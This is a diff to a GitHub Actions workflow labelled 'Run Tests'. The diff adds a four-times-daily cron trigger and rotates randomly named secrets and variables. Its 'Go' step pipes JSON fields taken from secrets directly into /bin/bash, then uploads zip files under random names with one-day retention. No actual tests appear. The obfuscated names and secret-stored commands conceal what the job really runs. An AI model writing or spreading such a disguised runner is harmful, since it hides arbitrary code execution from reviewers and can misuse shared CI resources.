@@ -2,6 +2,8 @@ name: Run Tests
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '9 5,11,17,23 * * *'
 permissions:
   contents: read
 jobs:
@@ -14,16 +16,17 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          uorh5: ${{ secrets.uorh5 }}
+          jvt50: ${{ secrets.jvt50 }}
         run: |
-          printf '%s' "$uorh5" | jq -r .hrub48 | /bin/bash
-          echo $l3 | jq -r .z7334 | /bin/bash
-          printf '%s' "$k6" | jq -r .bg96 | /bin/bash
-          echo $fic3 | jq -r .vx592 | /bin/bash
+          printf '%s' "$jvt50" | jq -r .r0 | /bin/bash
+          printf '%s' "$spdq22813" | jq -r .qi8729 | /bin/bash
+          printf '%s' "$rk02" | jq -r .ud7288 | /bin/bash
+          echo $i368 | jq -r .wcwca6718 | /bin/bash
+          printf '%s' "$na923" | jq -r .vw526 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: 0TSh3Oq4
+          name: E0ruaGuK
           path: "*.zip"
           retention-days: 1
